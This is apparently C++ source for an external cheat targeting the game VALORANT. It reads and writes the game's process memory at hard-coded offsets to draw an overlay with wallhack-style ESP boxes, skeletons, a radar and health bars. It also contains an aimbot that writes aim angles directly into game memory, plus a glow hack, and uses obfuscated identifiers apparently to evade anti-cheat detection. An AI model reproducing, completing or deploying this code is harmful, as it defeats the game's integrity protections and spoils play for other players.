		ImFont* FontAwesomeBig = io.Fonts->AddFontFromMemoryCompressedTTF(fa6_solid_compressed_data, fa6_solid_compressed_size, 19.f, nullptr, icons_ranges);
		ImFont* TitleFont = io.Fonts->AddFontFromMemoryCompressedTTF(trebucbd_compressed_data, trebucbd_compressed_size, 30, nullptr, io.Fonts->GetGlyphRangesDefault());

			while (true)
			{
				Sleep(5);

				world = lexemveread<uintptr_t>(lexemvevirtualaddy + 0x60);
				world = check::validate_pointer(world);
				if (!world) continue;

				game_instance = lexemveread2<uintptr_t>(world + 0x1A0);//offset 0x1a0
				if (!game_instance) continue;

				persistent_level = lexemveread2<uintptr_t>(world + 0x38);
				persistent_level = check::validate_pointer(persistent_level);
				if (!persistent_level) continue;

				uintptr_t local_players = lexemveread2<uintptr_t>(game_instance + 0x40);//offset 0x40
				if (!local_players) continue;

				local_player = lexemveread2<uintptr_t>(local_players);
				if (!local_player) continue;

				Sleep(500);

				LAPNT::player_controller = lexemveread2<uintptr_t>(local_player + 0x38);

				cntrlrttn = lexemveread<fvector>(LAPNT::player_controller + 0x440);

				LAppwn = lexemveread2<DWORD_PTR>(LAPNT::player_controller + 0x460);
				playerstate = lexemveread2<uintptr_t>(LAppwn + 0x3f0);//offset
				teamComponent = lexemveread2<uintptr_t>(playerstate + 0x628);//offset
				teamID = lexemveread2<int>(teamComponent + 0xf8);


				uintptr_t local_pawn = lexemveread2<uintptr_t>(LAPNT::player_controller + 0x460);

				LAPNT::local_pawn = local_pawn;

				LAPNT::camera_manager = lexemveread2<uintptr_t>(LAPNT::player_controller + 0x478);//offsets player_camera 0x478
				LAPNT::camera_position = lexemveread<fvector>(LAPNT::camera_manager + 0x1280);


				uintptr_t actor_array = lexemveread2<uintptr_t>(persistent_level + 0xA0);//offset 0xa0
				if (!actor_array) continue;

				actor_count = lexemveread2<INT32>(persistent_level + 0xb8);
				if (!actor_count) continue;


				for (int x = 0; x < actor_count; x++)
				{

					LApactr = lexemveread2<uintptr_t>(actor_array + (x * 0x8));
					if (!LApactr) continue;

					uintptr_t for_actor = lexemveread2<uintptr_t>(lexemvevirtualaddy + actor_array + (x * 0x8));

					INT32 unique_id = lexemveread2<INT32>(LApactr + 0x38);
					if (unique_id != 18743553) continue;

					uintptr_t mesh = lexemveread2<uintptr_t>(LApactr + 0x430);//offset 0x430
					if (!mesh) continue;

					VsblesA = Vsbles(mesh);

					uintptr_t playerstate = lexemveread2<uintptr_t>(LApactr + 0x3F0);
					uintptr_t team_component = lexemveread2<uintptr_t>(playerstate + 0x628);
					int team_id = lexemveread2<int>(team_component + 0xF8);
					int mybone_count = lexemveread2<int>(mesh + 0x5E0); // botlara çizerse bura
					bool is_bot = mybone_count == 103;
					if (team_id == teamID && !is_bot) {
						continue;
					}

					LAp_rot = lexemveread2<uintptr_t>(LApactr + 0x230);// offsets 0x230
					if (!LAp_rot) continue;

					uintptr_t damage_handler = lexemveread2<uintptr_t>(LApactr + 0x9f8);
					if (!damage_handler) continue;

					LAphlth = lexemveread2<float>(damage_handler + 0x1B0);

					if (LAphlth <= 0) continue;

					uintptr_t bone_array = lexemveread2<uintptr_t>(mesh + 0x5D8);
					if (!bone_array) continue;

					INT32 bone_count = lexemveread2<INT32>(mesh + 0x5E0);
					if (!bone_count) continue;





					{
						uintptr_t actor;
						uintptr_t mesh;
						uintptr_t bone_array;
						uintptr_t root_component;
						uintptr_t damage_handler;

						INT32 bone_count;
						INT32 ammo_count;

						std::string weapon_name;
						std::string agent_name;
						std::string player_name;

						float distance;
						float health;
						float shield;

						bool is_valid;
						bool is_damage_handler_guarded;
						bool is_mesh_guarded;
					};
					uintptr_t for_mesh = 0x1;
					bool is_damage_handler_guarded = false, is_mesh_guarded = false;
					//define player
					LAPLYR this_player{
						for_actor, //guarded region ptr
						for_mesh, //guarded region ptr
						LApactr,
						mesh,
						bone_array,
						LAp_rot,
						damage_handler,
						bone_count,
						0, //ammo count
						"", //weapon name
						"", //agent name
						"", //player name
						0.f, //distance
						LAphlth, //health
						0.f, //shleid
						true,
						is_damage_handler_guarded,
						is_mesh_guarded
					};

					//pushback player (if he isnt in the actor list yet)
					if (!player_pawns.empty()) {
						auto found_player = std::find(player_pawns.begin(), player_pawns.end(), this_player);
						if (found_player == player_pawns.end())
						{
							player_pawns.push_back(this_player);
						}


					}
					else
					{
						player_pawns.push_back(this_player);
					}

				}
				Sleep(500);
			}
	}

#define DegreeToRadian( Degree )	( ( Degree ) * ( M_PI / 180.0f ) )



	static fvector pRadar;


	Vector2 WorldRadar(fvector srcPos, fvector distPos, float yaw, float radarX, float radarY, float size)
	{
		auto cosYaw = cos(DegreeToRadian(yaw));
		auto sinYaw = sin(DegreeToRadian(yaw));

		auto deltaX = srcPos.x - distPos.x;
		auto deltaY = srcPos.y - distPos.y;

		auto locationX = (float)(deltaY * cosYaw - deltaX * sinYaw) / 45.f;
		auto locationY = (float)(deltaX * cosYaw + deltaY * sinYaw) / 45.f;

		if (locationX > (size - 2.f))
			locationX = (size - 2.f);
		else if (locationX < -(size - 2.f))
			locationX = -(size - 2.f);

		if (locationY > (size - 6.f))
			locationY = (size - 6.f);
		else if (locationY < -(size - 6.f))
			locationY = -(size - 6.f);

		return Vector2((int)(-locationX + radarX), (int)(locationY + radarY));
	}
	void DrawRadar(fvector EntityPos)
	{
		auto radar_posX = pRadar.x + 135;
		auto radar_posY = pRadar.y + 135;
		uint64_t LocalRootComp = lexemveread2<uint64_t>(LAPNT::local_pawn + 0x230);
		fvector LocalPos = lexemveread<fvector>(LocalRootComp + 0x164);
		auto Radar2D = WorldRadar(LocalPos, EntityPos, LACAMRA::rotation.y, radar_posX, radar_posY, 135.f);
		ImVec4 S4 = ImVec4(1.0f, 0.0f, 0.0f, 1.0f);
		DrawCircleRadar(Radar2D.x, Radar2D.y, 4, S4); //R1);
	}

	auto LATMID(uintptr_t APawn) -> int {
		auto PlayerState = lexemveread<uintptr_t>(APawn + 0x3F0);//offset
		auto TeamComponent = lexemveread<uintptr_t>(PlayerState + 0x628);//offset
		return lexemveread<int>(TeamComponent + 0xF8);//offset
	};

	void LAPTLARE()
	{
		auto ViewInfo = lexemveread<FMinimalViewInfo>(LAPNT::camera_manager + 0x2020 + 0x10);
		LACAMRA::location = ViewInfo.Location;
		LACAMRA::rotation = ViewInfo.Rotation;
		LACAMRA::fov = ViewInfo.FOV;
	}

	void DrawFilledRect(int x, int y, int w, int h, RGBA* color)
	{
		ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 153.0, color->B / 51.0, color->A / 255.0)), 0, 0);
	}

	auto DrawHealthBar(fvector RootPositionn, float Width, float Height, float Health, float RelativeDistance) -> void
	{
		auto HPBoxWidth = 1 / RelativeDistance;

		auto HPBox_X = RootPositionn.x - Width / 2 - 5 - HPBoxWidth;
		auto HPBox_Y = RootPositionn.y - Height / 2 + (Height - Height * (Health / 100));

		int HPBoxHeight = Height * (Health / 100);

		DrawFilledRect(HPBox_X, HPBox_Y, HPBoxWidth, HPBoxHeight, &Col.green);
		DrawRect(HPBox_X - 1, HPBox_Y - 1, HPBoxWidth + 2, HPBoxHeight + 2, &Col.black, 1);
	}

	auto Draw2DBox(fvector RootPositionn, float Width, float Height, ImColor Color) -> void
	{
		DrawNormalBox(RootPositionn.x - Width / 2, RootPositionn.y - Height / 2, Width, Height, 1.0f, Color);
	}

	auto RelativeLocation(uintptr_t APawn) -> fvector {
		auto RootComponent = lexemveread<uintptr_t>(APawn + 0x230);
		return lexemveread<fvector>(RootComponent + 0x164);
	}

	auto DrawLine(const ImVec2& x, const ImVec2 y, ImU32 color, const FLOAT width) -> void
	{
		ImGui::GetOverlayDrawList()->AddLine(x, y, color, width);
	}

	void DrawCircleFilled(int x, int y, int radius, ImVec4 color, float segments)
	{
		ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(x, y), radius, ImGui::ColorConvertFloat4ToU32(color), segments);
	}


	void LARNDRPLYRSS()
	{
		LAPTLARE();
		auto isFrames = ImGui::GetFrameCount();

		static float isRed = 0.0f, isGreen = 0.01f, isBlue = 0.0f;

		ImVec4 isRGB = ImVec4(isRed, isGreen, isBlue, 1.0f);


			if (isFrames % 1 == 0)
			{

				if (isGreen == 0.01f && isBlue == 0.0f)
				{
					isRed += 0.01f;

				}

				if (isRed > 0.99f && isBlue == 0.0f)
				{
					isRed = 1.0f;

					isGreen += 0.01f;

				}

				if (isGreen > 0.99f && isBlue == 0.0f)
				{
					isGreen = 1.0f;

					isRed -= 0.01f;

				}

				if (isRed < 0.01f && isGreen == 1.0f)
				{
					isRed = 0.0f;

					isBlue += 0.01f;

				}

				if (isBlue > 0.99f && isRed == 0.0f)
				{
					isBlue = 1.0f;

					isGreen -= 0.01f;

				}

				if (isGreen < 0.01f && isBlue == 1.0f)
				{
					isGreen = 0.0f;

					isRed += 0.01f;

				}

				if (isRed > 0.99f && isGreen == 0.0f)
				{
					isRed = 1.0f;

					isBlue -= 0.01f;

				}

				if (isBlue < 0.01f && isGreen == 0.0f)
				{
					isBlue = 0.0f;

					isRed -= 0.01f;

					if (isRed < 0.01f)
						isGreen = 0.01f;

				}

			}


			int closestplayer = 1337;
			float closest_distance = FLT_MAX;

			for (int x = 0; x < player_pawns.size(); x++)
			{
				LAPLYR this_player = player_pawns[x];

				if (player_pawns.empty()) {
					return;
				}

				float health = 0;
				health = lexemveread<float>(this_player.damage_handler + 0x1B0);

				if (health <= 0.f || health > 999.f)
				{
					player_pawns[x].is_valid = false;
				}

				if (!this_player.is_valid)
				{
					auto erase_player = std::find(player_pawns.begin(), player_pawns.end(), this_player);
					player_pawns.erase(erase_player);
					continue;
				}

				fvector zero = LABNMTRX(0, this_player);
				fvector head = LABNMTRX(8, this_player);

				fvector zero_r = fvector(zero.x, zero.y, zero.z - 5);

				fvector vBaseBoneOut = w2s(fvector(zero.x, zero.y, zero.z));
				fvector vBaseBoneOut2 = w2s(fvector(zero.x, zero.y, zero.z - 15));

				fvector vHeadBoneOut = w2s(fvector(head.x, head.y, head.z));

				fvector vHeadBoneOut2 = w2s(fvector(head.x, head.y, head.z + 15));
				fvector vHeadBoneOut3 = w2s(fvector(head.x, head.y, head.z + 40));

				float BoxHeight = abs(vHeadBoneOut2.y - vBaseBoneOut.y);
				float BoxWidth = BoxHeight * 0.55;
				float BoxWidth3 = BoxHeight * 0.40;

				fvector head_r = fvector(head.x, head.y, head.z + 20);
				fvector head_r_2 = fvector(head.x, head.y, head.z + 30);

				fvector zero_w2s = w2s(zero);
				fvector head_w2s = w2s(head);

				fvector zero_w2s_r = w2s(zero_r);
				fvector head_w2s_r = w2s(head_r);

				fvector head_w2s_r_2 = w2s(head_r_2);

				struct FLinearColor {
					float R; // 0x00(0x04)
					float G; // 0x04(0x04)
					float B; // 0x08(0x04)
					float A; // 0x0c(0x04)
				};

				int Width = GetSystemMetrics(SM_CXSCREEN);
				int Height = GetSystemMetrics(SM_CYSCREEN);

				pRadar.x = (Width / 2) + 550;
				pRadar.y = Width / 2 - Height / 2 - 300;

				auto RelativeLocationn = RelativeLocation(this_player.actor);
				auto RelativePosition = RelativeLocationn - LACAMRA::location;
				auto RelativeDistance = RelativePosition.Length() / 10000 * 2;
				auto RelativeLocationProjected = w2s(RelativeLocationn);


				bool active = is_dormant(this_player);
				if (config.player_ignore_dormant && !active)
					continue;

				float distance = LACAMRA::location.distance(zero) / 100.f;

				if (config.distancecontrol && (float)config.max_distance < distance)
					continue;

				if (config.circlehead == true)
				{
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(vHeadBoneOut.x, vHeadBoneOut.y), BoxWidth / 7, ImColor(config.headboxcolor), 64, 1.5f);
				}

				if (config.glow)
					lxmvwrte<float>(this_player.actor + 0x6f0, 300);

				int bottom_text_offset = 2;

				if (config.player_healthbar)
				{
					DrawHealthBar(RelativeLocationProjected, BoxWidth, BoxHeight, health, RelativeDistance);
				}

				ImVec4 S4 = to_vec4(2, 160, 115, (int)Alpha);
				//ImVec4 S4 = ImVec4(1.0f, 0.0f, 0.0f, 1.0f);

				if (config.radar)
				{
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(pRadar.x, pRadar.y), ImVec2(pRadar.x + 270, pRadar.y + 270), ImGui::ColorConvertFloat4ToU32(ImVec4(255, 255, 255, 255)), 2);
					auto radar_posX = pRadar.x + 135;
					auto radar_posY = pRadar.y + 135;
					DrawLine(ImVec2(radar_posX, radar_posY), ImVec2(radar_posX, radar_posY + 135), ImGui::ColorConvertFloat4ToU32(ImVec4(236, 236, 236, 255)), 2);
					DrawLine(ImVec2(radar_posX, radar_posY), ImVec2(radar_posX, radar_posY - 135), ImGui::ColorConvertFloat4ToU32(ImVec4(236, 236, 236, 255)), 2);
					DrawLine(ImVec2(radar_posX, radar_posY), ImVec2(radar_posX + 135, radar_posY), ImGui::ColorConvertFloat4ToU32(ImVec4(236, 236, 236, 255)), 2);
					DrawLine(ImVec2(radar_posX, radar_posY), ImVec2(radar_posX - 135, radar_posY), ImGui::ColorConvertFloat4ToU32(ImVec4(236, 236, 236, 255)), 2);
					DrawCircleFilled(radar_posX + 1, radar_posY + 1, 3, S4, 10);

					fvector pos = lexemveread<fvector>(this_player.root_component + 0x164);
					DrawRadar(pos);
				}



				ImGuiIO& io = ImGui::GetIO();
				ImFont* espfont = io.Fonts->AddFontFromFileTTF("C:\Windows\Fonts\Calibri.ttf", 14);
				ImGui::PushFont(espfont);
				ImGui::PopFont();


				if (config.agentnames == true)
				{

					int keyy = lexemveread<int>(this_player.actor + 0x18);
					std::string namee = get_fname(keyy);


					if (namee.find("None") != std::string::npos)
					{
						namee = "Lobi";
					}

					if (namee.find("Wushu") != std::string::npos)
					{
						namee = "Jett";
					}

					if (namee.find("Rift") != std::string::npos)
					{
						namee = "Astra";
					}

					if (namee.find("Grenadier") != std::string::npos)
					{
						namee = "Kay/O";
					}

					if (namee.find("Breach") != std::string::npos)
					{
						namee = "Breach";
					}

					if (namee.find("Sarge") != std::string::npos)
					{
						namee = "Brimstone";
					}

					if (namee.find("Deadeye") != std::string::npos)
					{
						namee = "Chamber";
					}

					if (namee.find("Gumshoe") != std::string::npos)
					{
						namee = "Cypher";
					}

					if (namee.find("Killjoy") != std::string::npos)
					{
						namee = "Killjoy";
					}

					if (namee.find("Sprinter") != std::string::npos)
					{
						namee = "Neon";
					}

					if (namee.find("Wraith") != std::string::npos)
					{
						namee = "Omen";
					}

					if (namee.find("Phoenix") != std::string::npos)
					{
						namee = "Phoenix";
					}

					if (namee.find("Clay") != std::string::npos)
					{
						namee = "Raze";
					}

					if (namee.find("Vampire") != std::string::npos)
					{
						namee = "Reyna";
					}

					if (namee.find("Thorne") != std::string::npos)
					{
						namee = "Sage";
					}

					if (namee.find("Guide") != std::string::npos)
					{
						namee = "Skye";
					}

					if (namee.find("Hunter_PC_C") != std::string::npos)
					{
						namee = "Sova";
					}

					if (namee.find("Pandemic") != std::string::npos)
					{
						namee = "Viper";
					}

					if (namee.find("Stealth") != std::string::npos)
					{
						namee = "Yoru";
					}

					if (namee.find("BountyHunter") != std::string::npos)
					{
						namee = "Fade";
					}

					if (namee.find("TrainingBot") != std::string::npos)
					{
						namee = "Bot";
					}

					if (namee.find("AggroBot") != std::string::npos)
					{
						namee = "Gekko";
					}

					if (namee.find("Mage") != std::string::npos)
					{
						namee = "Harbor";
					}

					if (namee.find("Cable") != std::string::npos)
					{
						namee = "Deadlock";
					}

					namee = namee;
					ImVec2 TextSize2 = ImGui::CalcTextSize(namee.c_str());

					ImGui::GetOverlayDrawList()->AddText(ImVec2(vHeadBoneOut3.x - (TextSize2.x / 2), vHeadBoneOut3.y + bottom_text_offset), ImGui::GetColorU32({ 0.3f, 0.7f, 1.f, 1.f }), namee.c_str());
					bottom_text_offset += 14;
				}

				if (config.player_box)
				{
					if (config.esptype == 0)
					{
						float BoxHeight = zero_w2s_r.y - head_w2s_r.y;
						float BoxWidth = BoxHeight / 2.f;
						LAPDRWCRNbx(zero_w2s_r.x - (BoxWidth / 2), head_w2s_r.y, BoxWidth, BoxHeight, config.espcolor, 0.6f);
					}

					if (config.esptype == 1)
					{
						Draw2DBox(RelativeLocationProjected, BoxWidth3, BoxHeight, config.espcolor);
					}

					if (config.esptype == 2)
					{
						LAdrw3dbx(zero, fvector(head.x, head.y, head.z + 20), 38, config.espcolor, 0.7f);
					}
				}

				if (config.player_skeleton)
				{
					LADRWSKLTN(this_player, ImVec4(config.skeleton), 0.3f);
				}


				if (config.player_distance)
				{
					char distance_text[256];
					sprintf_s(distance_text, "[ %.fm ]", distance);
					ImVec2 text_size = ImGui::CalcTextSize(distance_text);
					ImGui::GetOverlayDrawList()->AddText(ImVec2(zero_w2s_r.x - (text_size.x / 2), zero_w2s_r.y + bottom_text_offset), ImGui::GetColorU32({ 0.3f, 0.7f, 1.f, 1.f }), distance_text);
					bottom_text_offset += 14;
				}

				if (config.player_snapline)
				{
					if (config.linetype == 0)
					{
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(LAcenter_x, Height * 2), ImVec2(zero_w2s_r.x, zero_w2s_r.y + bottom_text_offset), ImGui::GetColorU32(config.snapcolor), 1.f);
					}

					if (config.linetype == 1)
					{
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(LAcenter_x, LAcenter_y), ImVec2(zero_w2s_r.x, zero_w2s_r.y + bottom_text_offset), ImGui::GetColorU32(config.snapcolor), 1.f);
					}

					if (config.linetype == 2)
					{
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(LAcenter_x, LAcenter_y / 2), ImVec2(zero_w2s_r.x, zero_w2s_r.y + bottom_text_offset), ImGui::GetColorU32(config.snapcolor), 1.f);
					}
				}



				if (config.player_view_angle)
				{
					fvector view_angle = lexemveread<fvector>(this_player.root_component + 0x170);

					fvector test2, headpos;

					headpos = head;

					LApangrtn(view_angle, &test2);
					test2.x *= 260;
					test2.y *= 260;
					test2.z *= 260;

					fvector end = headpos + test2;
					fvector test1, test3;
					test1 = w2s(headpos);
					test3 = w2s(end);

					ImGui::GetOverlayDrawList()->AddLine(ImVec2(test1.x, test1.y), ImVec2(test3.x, test3.y), ImGui::GetColorU32({ 0.0f, 1.0f, 0.0f, 1.0f }), 1.f);
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(test3.x, test3.y), BoxWidth / 7, ImGui::GetColorU32({ 0.33f, 0.33f, 0.33f, 1.f }), 32, 2.f);
				}

				float delta_x = head_w2s.x - (LAWidth / 2.f);
				float delta_y = head_w2s.y - (LAHeight / 2.f);
				float dist = sqrtf(delta_x * delta_x + delta_y * delta_y);
				float fovdist = LACALDISTNC(LAWidth / 2, LAHeight / 2, head_w2s.x, head_w2s.y);
				if ((dist < closest_distance) && fovdist < config.aimbot_fov) {
					closest_distance = dist;
					closestplayer = x;
				}

			}

			if (config.aimenable && !config.rcs && closestplayer != 1337)
			{
				LAPLYR LAthsplyer = player_pawns[closestplayer];
				fvector LAhed = LABNMTRX(8, LAthsplyer);
				fvector LAbody = LABNMTRX(6, LAthsplyer);
				fvector LAplvs = LABNMTRX(3, LAthsplyer);
				fvector LAbne;

				if (config.aimboness == 0)
				{
					LAbne = LAhed;
				}

				if (config.aimboness == 1)
				{
					LAbne = LAbody;
				}

				if (config.aimboness == 2)
				{
					LAbne = LAplvs;
				}

				fvector rootpos = lexemveread<fvector>(LAthsplyer.root_component + 0x164);

				if (LAbne.z <= rootpos.z)
				{
					return;
				}

				fvector localView = lexemveread<fvector>(LAPNT::player_controller + 0x440);
				fvector vecCaclculatedAngles = cLAmpasdp205(LACAMRA::location, LAbne);
				fvector angleEx = LAPSNNANGLE(LACAMRA::location, LAbne);
				fvector fin = fvector(vecCaclculatedAngles.y, angleEx.y, 0);
				fvector delta = fin - localView;
				LAPNRMLZEANGL(delta);

				fvector TargetAngle = localView + (delta / config.aimbot_smooth);
				fvector TargetAngle2 = localView + delta;
				LAPNRMLZEANGL(TargetAngle);
				LAPNRMLZEANGL(TargetAngle2);
				//Clamp(TargetAngle2);


				if (GetAsyncKeyState(AimKeyList[config.aimbotkey]) & 0x8000)
				{
					if (config.visiblecheck == true)
					{
						if (VsblesA)
						{
							lxmvwrte<fvector>(LAPNT::player_controller + 0x440, TargetAngle);

						}
					}
					else
					{
						lxmvwrte<fvector>(LAPNT::player_controller + 0x440, TargetAngle);

					}

				}
			}
			if (config.aimenable && config.rcs && closestplayer != 1337)
			{
				LAPLYR LAthsplyer = player_pawns[closestplayer];
				fvector LAhed = LABNMTRX(8, LAthsplyer);
				fvector LAbody = LABNMTRX(6, LAthsplyer);
				fvector LAplvs = LABNMTRX(3, LAthsplyer);
				fvector LAbne;

				if (config.aimboness == 0)
				{
					LAbne = LAhed;
				}

				if (config.aimboness == 1)
				{
					LAbne = LAbody;
				}

				if (config.aimboness == 2)
				{
					LAbne = LAplvs;
				}

				fvector rootpos = lexemveread<fvector>(LAthsplyer.root_component + 0x164);

				if (LAbne.z <= rootpos.z)
				{
					return;
				}

				fvector localView = lexemveread<fvector>(LAPNT::player_controller + 0x440);
				fvector vecCaclculatedAngles = cLAmpasdp205(LACAMRA::location, LAbne);
				fvector angleEx = LAPSNNANGLE(LACAMRA::location, LAbne);
				fvector fin = fvector(vecCaclculatedAngles.y, angleEx.y, 0);
				fvector delta = fin - localView;
				fvector TargetAngle2 = localView + delta;
				LAPLAMP(TargetAngle2);


				if (GetAsyncKeyState(AimKeyList[config.aimbotkey]) & 0x8000)
				{
					if (config.visiblecheck == true)
					{
						if (VsblesA)
						{
							LAPRccS(TargetAngle2, LACAMRA::rotation, config.aimbot_smooth);
						}
					}
					else
					{
						LAPRccS(TargetAngle2, LACAMRA::rotation, config.aimbot_smooth);

					}


				}

				float temp = LAFOVGT(LACAMRA::rotation, vecCaclculatedAngles);

			}

			if (config.aimbot_draw_fov)
			{
				ImGui::GetOverlayDrawList()->AddCircle(ImVec2(LAcenter_x, LAcenter_y), config.aimbot_fov, ImGui::GetColorU32({ 1.f, 0.f, 0.f, 1.f }), 64, 2.f);
			}

	}



	static HWND LAWNDWWW = NULL;
	IDirect3D9Ex* p_Object = NULL;
	static LPDIRECT3DDEVICE9 D3dDevice = NULL;
	static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;
	HWND LAHND = NULL;
	RECT LAGMRCT = { NULL };
	D3DPRESENT_PARAMETERS d3dpp;
	const MARGINS LAMRGNN = { -1 };

	DWORD ScreenCenterX = 960;
	DWORD ScreenCenterY = 540;
	MSG LAMSSG = { NULL };

	bool LAMNPON = true;
	bool LAFRSTTM = true;

	bool LAMGNSTRT = false;

	void LARNNDDDRR() {

		ImGui_ImplDX9_NewFrame();
		ImGui_ImplWin32_NewFrame();
		ImGui::NewFrame();

		if (GetAsyncKeyState(VK_INSERT) & 1)
			LAMNPON = !LAMNPON;
		valthe();
		if (LAMNPON)
		{
			ImGui::GetIO().MouseDrawCursor = 1;
			if (ImGui::Begin("", 0, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoSavedSettings))
			{
				scarlet();
			}ImGui::End();
		}
		else
			ImGui::GetIO().MouseDrawCursor = 0;



		LARNDRPLYRSS();


		D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
		D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
		D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
		D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

		if (D3dDevice->BeginScene() >= 0) {
			ImGui::Render();
			ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
			D3dDevice->EndScene();
		}
		HRESULT LARSLT = D3dDevice->Present(NULL, NULL, NULL, NULL);

		if (LARSLT == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) {
			ImGui_ImplDX9_InvalidateDeviceObjects();
			D3dDevice->Reset(&d3dpp);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
	}

	bool LASTRTDRX() {
		if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
			return false;

		ZeroMemory(&d3dpp, sizeof(d3dpp));
		d3dpp.BackBufferWidth = LAWidth;
		d3dpp.BackBufferHeight = LAHeight;
		d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
		d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
		d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
		d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
		d3dpp.EnableAutoDepthStencil = TRUE;
		d3dpp.hDeviceWindow = LAWNDWWW;
		d3dpp.Windowed = TRUE;

		p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, LAWNDWWW, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

		IMGUI_CHECKVERSION();

		ImGui::CreateContext();
		ImGuiIO& io = ImGui::GetIO();


		ImGui_ImplWin32_Init(LAWNDWWW);
		ImGui_ImplDX9_Init(D3dDevice);

		p_Object->Release();
		return true;
	}

	void WTFRWNDW() {
		while (true) {
			HWND LAFRGRNDWNDDW = GetForegroundWindow();
			HWND LATRGTWNDW = FindWindowA(0, "VALORANT  ");

			if (LAFRGRNDWNDDW == LATRGTWNDW)
				break;

			Sleep(200);
		}
	}

	void LARNDRLPP() {
		static RECT old_rc;
		ZeroMemory(&LAMSSG, sizeof(MSG));

		while (LAMSSG.message != WM_QUIT)
		{
			if (PeekMessage(&LAMSSG, LAWNDWWW, 0, 0, 0x0001))
			{
				TranslateMessage(&LAMSSG);
				DispatchMessage(&LAMSSG);
			}

			HWND hwnd_active = GetForegroundWindow();

			if (hwnd_active == LAHND) {
				HWND hwndtest = GetWindow(hwnd_active, 3);
				SetWindowPos(LAWNDWWW, hwndtest, 2, 2, -3, -3, 0x0002 | 0x0001);
			}

			RECT rc;
			POINT xy;

			ZeroMemory(&rc, sizeof(RECT));
			ZeroMemory(&xy, sizeof(POINT));
			GetClientRect(LAHND, &rc);
			ClientToScreen(LAHND, &xy);
			rc.left = xy.x;
			rc.top = xy.y;

			ImGuiIO& io = ImGui::GetIO();
			io.ImeWindowHandle = LAHND;
			io.DeltaTime = 1.0f / 60.0f;

			POINT p;
			GetCursorPos(&p);
			io.MousePos.x = p.x - xy.x;
			io.MousePos.y = p.y - xy.y;

			if (GetAsyncKeyState(VK_LBUTTON)) {
				io.MouseDown[0] = true;
				io.MouseClicked[0] = true;
				io.MouseClickedPos[0].x = io.MousePos.x;
				io.MouseClickedPos[0].x = io.MousePos.y;
			}
			else
				io.MouseDown[0] = false;

			if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
			{
				old_rc = rc;

				LAWidth = rc.right;
				LAHeight = rc.bottom;

				d3dpp.BackBufferWidth = LAWidth;
				d3dpp.BackBufferHeight = LAHeight;
				SetWindowPos(LAWNDWWW, (HWND)0, xy.x + 2, xy.y + 2, LAWidth - 3, LAHeight - 3, 0x0008);
				D3dDevice->Reset(&d3dpp);
			}

			LARNNDDDRR();

		}
		ImGui_ImplDX9_Shutdown();
		ImGui_ImplWin32_Shutdown();
		ImGui::DestroyContext();

		DestroyWindow(LAWNDWWW);
	}
	void LASTPRNDR() {
		TriBuf->Release();
		D3dDevice->Release();
		p_Object->Release();

		DestroyWindow(LAWNDWWW);
		UnregisterClassW(((overlayString)), NULL);
	}

	LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam) {
		if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
			return true;

		switch (Message)
		{
		case WM_DESTROY:
			LASTPRNDR();
			PostQuitMessage(0);
			exit(4);
			break;
		case WM_SIZE:
			if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
			{
				ImGui_ImplDX9_InvalidateDeviceObjects();
				d3dpp.BackBufferWidth = LOWORD(lParam);
				d3dpp.BackBufferHeight = HIWORD(lParam);
				HRESULT hr = D3dDevice->Reset(&d3dpp);
				if (hr == D3DERR_INVALIDCALL)
					IM_ASSERT(0);
				ImGui_ImplDX9_CreateDeviceObjects();
			}
			break;
		default:
			return DefWindowProc(hWnd, Message, wParam, lParam);
			break;
		}
		return 0;
	}

	void LACRTWND0W() {
		WNDCLASSEX LAWCCC;
		ZeroMemory(&LAWCCC, sizeof(LAWCCC));
		LAWCCC.cbSize = sizeof(LAWCCC);
		LAWCCC.lpszClassName = ((overlayString));
		LAWCCC.lpfnWndProc = WinProc;
		RegisterClassEx(&LAWCCC);

		if (LAHND)
		{
			GetClientRect(LAHND, &LAGMRCT);
			POINT LAXXYY;
			ClientToScreen(LAHND, &LAXXYY);
			LAGMRCT.left = LAXXYY.x;
			LAGMRCT.top = LAXXYY.y;

			LAWidth = LAGMRCT.right;
			LAHeight = LAGMRCT.bottom;
		}
		else
			exit(2);

		LAWNDWWW = CreateWindowExW(NULL, (overlayString), (overlayString), 0x80000000L | 0x10000000L, 2, 2, LAWidth - 2, LAHeight - 2, 0, 0, 0, 0);

		DwmExtendFrameIntoClientArea(LAWNDWWW, &LAMRGNN);
		SetWindowLong(LAWNDWWW, (-20), 0x00000020L | 0x00000080L | 0x00080000);

		ShowWindow(LAWNDWWW, SW_SHOW);
		UpdateWindow(LAWNDWWW);
	}

	void LASTRTC() {
		LAHND = FindWindowA(0, _("VALORANT  "));

		LACRTWND0W();

		LASTRTDRX();

		WTFRWNDW();

